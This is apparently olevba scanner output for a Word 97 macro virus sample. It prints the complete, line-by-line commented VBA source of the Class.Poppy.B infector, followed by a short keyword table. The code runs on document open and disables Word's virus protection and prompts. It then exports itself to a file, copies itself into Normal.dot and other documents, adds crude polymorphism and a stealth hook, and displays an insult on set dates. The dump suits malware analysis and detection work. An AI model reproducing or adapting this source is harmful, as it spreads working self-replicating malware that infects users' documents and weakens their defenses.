olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class-ec355505e0bbc0cd4440f9b44490afc729159ccc
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Class-ec355505e0bbc0cd4440f9b44490afc729159ccc 
in file: Virus.MSWord.Class-ec355505e0bbc0cd4440f9b44490afc729159ccc - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'W97/Class.Poppy.B
'Word 97 Class Object Infector
'First Ever Class Object Infetor

Sub AutoOpen()

	' AutoOpen Sub In Document

On Error GoTo out

	' Handle Errors

Options.VirusProtection = False

	' Turn Off Virus Protection

Options.SaveNormalPrompt = False

	' Turn Off Normal.dot Save Prompt

Options.ConfirmConversions = False

	' Turn Off Conversion Prompt (from 95 -> 97)

ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines

	' Count The Number Of Code Lines In The Document

nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines

	' Count The Number Of Code Lines In The Normal.dot

If nt > 70 And ad > 0 Then GoTo out

	' If We Are Installed In Both (Lines > 0 and 72) Then Exit

If nt < 70 Then

	' If We Are Not In The Normal.dot (Lines < 72) Then Install Us

    Set infect = NormalTemplate.VBProject.VBComponents.Item(1)

	' Set Normal.dot Class Section As Infect Object (What We Want To Infect)

    ActiveDocument.VBProject.VBComponents.Item(1).Name = infect.Name

	' Swamp The Class Section Names (Active Doc <- Normal Template)

    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"

	' Export Our Virus Code

End If

If ad = 0 Then Set infect = ActiveDocument.VBProject.VBComponents.Item(1)

	' If We Are Not In The Active Doc (Lines < 0) Then Install Us

If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"

	' If The Day And Time Are Right Insult The User

infect.codemodule.AddFromFile ("c:\class.sys")

	' Use The Infect Object - Import Your Virus Code

With infect.codemodule

	' With The Newly Infected Class Object

    For x = 1 To 4

	' Clean Up The First 4 Lines Of Header-Code

    .deletelines 1

	' Delete Line 1 - 4 Times

    Next x

End With

If nt < 70 Then

	' If We Just Infected The Normal.Dot

    With infect.codemodule

    .replaceline 1, "Sub AutoClose()"

	' Change AutoOpen (on line 1) to AutoClose

    .replaceline 71, "Sub ToolsMacro()"

	' Change Sub ViewVBCode (on line 71) to ToolsMacro

    End With

End If

With infect.codemodule

	' With The Newly Infected Object

    For x = 2 To 72 Step 2

	' Use Word Object Data As Polymorpic Code On Every Other Line

    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow

    Next x

End With

out:

If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

	' If We Just Infected A Document Save It On Close

End Sub

Sub ViewVBCode()

	' Stealth Hook

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

